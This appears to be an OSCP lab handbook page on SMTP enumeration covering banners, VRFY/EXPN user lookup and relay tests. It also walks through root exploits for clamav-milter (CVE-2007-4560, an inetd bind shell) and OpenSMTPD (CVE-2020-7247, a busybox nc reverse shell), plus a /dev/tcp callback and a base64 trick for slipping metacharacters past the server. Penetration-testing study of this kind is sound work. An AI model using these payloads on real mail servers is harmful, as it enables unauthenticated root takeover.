---
title: "SMTP Enumeration"
slug: smtp-enumeration
category: notes
handbook: oscp
tags: ["smtp", "enumeration"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "SMTP on 25 is a mail server, and the useful checks are three: read the banner for the daemon and version, ask the server which users exist with `VRFY`/`EXPN`, and test whether it will relay mail."
---
SMTP on 25 is a mail server, and the useful checks are three: read the banner for the daemon and version, ask the server which users exist with `VRFY`/`EXPN`, and test whether it will relay mail. The version is the important part. Old mail stacks carry remote bugs, and the surrounding mail-filter software (milters, antivirus) is often more exposed than the MTA itself. On a box with no web path, an ancient Sendmail is a strong candidate for the door.

## Banner and Version

The banner prints on connect and names the daemon:

```bash
nc -nv TARGET 25
# 220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3
```

```bash
sudo nmap -sV -p25 --script "smtp-commands,smtp-open-relay,smtp-enum-users" TARGET
```

`smtp-commands` lists the verbs the server advertises (`VRFY`, `EXPN`, `ETRN`, `AUTH`), which shows which enumeration is possible. The banner alone decides whether there is a version-bound exploit, so search it before anything else.

The version is the whole game. On ClamAV the banner read Sendmail 8.13.4 on Debian sarge, a 2005-era stack. Sendmail itself was not the bug (the `smtp-vuln-cve2010-4344` script returned not vulnerable), the paired ClamAV milter was.

Not every daemon publishes a version, and the product name on its own is often enough. On Bratarina the banner was `220 bratarina ESMTP OpenSMTPD` with nothing after the name, which still narrows to a short CVE list.

### Enhanced status codes look like versions

When the server advertises `ENHANCEDSTATUSCODES`, every reply carries a three-part code such as `2.0.0` or `5.5.1` after the numeric reply code. nmap's `smtp-commands` prints the `HELP` response with the `214` reply codes stripped, so the enhanced code is left sitting next to the text:

```text
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
```

That is four `HELP` lines each prefixed `2.0.0`, not "OpenSMTPD 2.0.0". A number that repeats on every line of a response is a status code. The same applies to the error side: `503 5.5.4` and `500 5.5.1` are reply code plus enhanced code, and the enhanced code is the part that says why.

## User Enumeration

If `VRFY` or `EXPN` are enabled, the server confirms which local users exist, which feeds password spraying and SSH:

```text
nc TARGET 25
VRFY root       # 250 -> user exists, 550 -> does not
EXPN root       # expands aliases/mailing lists
```

Automate against a wordlist:

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/names.txt -t TARGET
```

`-M` picks the method (`VRFY`, `EXPN`, or `RCPT` when the first two are disabled). AutoRecon runs this automatically and drops the results in `scans/tcp25/`.

## Open Relay

An open relay accepts mail from an external sender to an external recipient, useful for phishing and sometimes for reaching internal hosts:

```bash
sudo nmap -p25 --script smtp-open-relay TARGET
```

Manually, `MAIL FROM` an outside address and `RCPT TO` another outside address, then see if the server accepts it instead of rejecting with `550 Relaying denied`.

## Version-Bound Exploits

Match the exploit to the software and its era, the same way [FTP Enumeration](/collections/oscp/ftp-enumeration) keys off the vsftpd banner.

The recurring Sendmail case is not Sendmail but **clamav-milter < 0.91.2 in black-hole mode (CVE-2007-4560)**. The milter passes the recipient address to a shell without sanitising it, so a crafted `RCPT TO` runs a command as root. EDB **4761** (Perl) automates it: it injects an inetd service line and reloads inetd.

```text
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">
250 2.0.0 Message accepted for delivery
```

The result is a **bind shell**, not a reverse shell. Nothing calls back, so there is no listener to open. Connect out to the port the payload opened:

```bash
perl 4761.pl TARGET
nc -nv TARGET 31337     # root shell (no job control, still root)
```

On ClamAV this landed a root shell directly, so there was no separate privilege escalation step.

Two things this box taught about picking the exploit:

- **Match the mechanism to the target era.** A newer GitHub PoC for the same CVE set up its bind shell on port 1001 through a different mechanism and never came up (`nc TARGET 1001` refused). EDB 4761's inetd trick worked because the box is old enough to actually run inetd (`/etc/init.d/inetd restart` succeeded). On a 2005 Debian, the 2005-era exploit fit.
- **Bind vs reverse decides whether a listener is involved.** Both PoCs here were bind shells, so `nc -lvnp` was never the right move. To get a reverse shell instead, edit the injected command in the script to a callback (`bash -i >& /dev/tcp/KALI/443 0>&1`) and start the listener first, or use Metasploit `exploit/unix/smtp/clamav_milter_blackhole`, which exposes the payload and port as options.

Finding this without the box name: the tell is the software and its age, not the hostname. An old Sendmail on a sarge-era box means `searchsploit sendmail` and a look at the milter, exactly as any old banner drives an exploit search in [Service Exploits](/collections/oscp/service-exploits).

### OpenSMTPD MAIL FROM injection (CVE-2020-7247)

OpenSMTPD 6.6.1p1 and earlier mishandles validation of the local part of a sender address in `smtp_mailaddr()`, so a `MAIL FROM` of the form `<;command;>` reaches a shell when the message is delivered locally. smtpd runs as root, so this is unauthenticated remote command execution as root and there is no privilege escalation phase after it.

```bash
python 47984.py <target> 25 'busybox nc <attacker> 80 -e sh'
```

The PoC prints `Payload sent` once smtpd accepts the injected `MAIL FROM`. Metasploit has a module for the same CVE.

Searching "OpenSMTPD" turns up two CVEs from the same period, and only one fits an exposed server:

- **CVE-2020-7247**: server side, the `MAIL FROM` injection above. This is the one for a listening smtpd.
- **CVE-2020-8794**: client side, an out-of-bounds read during bounce handling, so it needs the target acting as an SMTP client. Wrong shape for a box where 25 is simply open.

**The payload has to survive the SMTP dialogue.** It is spliced into a `MAIL FROM` command line, not typed at a shell, so protocol-breaking characters are rejected by the server before anything runs. On Bratarina:

```text
503 5.5.4 Invalid command arguments: Unsupported option &     # from >& and 0>&1
500 5.5.1 Invalid command: Pipelining not supported           # from a newline in the payload
```

A bash `/dev/tcp` one-liner cannot be sent as is. `busybox nc KALI PORT -e sh` has no `&`, no quotes, and no newline, so it goes through. Base64-wrapping (`echo <b64> | base64 -d | sh`) is the general answer when the command genuinely needs metacharacters, since base64 output is alphanumeric plus `+/=`.

## What to Look For

- Daemon and version in the banner, then `searchsploit` for it and its filters.
- Valid usernames from `VRFY`/`EXPN`, cross-referenced with [Credential Hunting](/collections/oscp/credential-hunting) for spraying against SSH or other logins.
- An open relay.

## Where This Sits

SMTP is one line in the attack-surface table from [Information Gathering](/collections/oscp/information-gathering). A version match goes to [Service Exploits](/collections/oscp/service-exploits); usernames found here feed [Credential Hunting](/collections/oscp/credential-hunting).
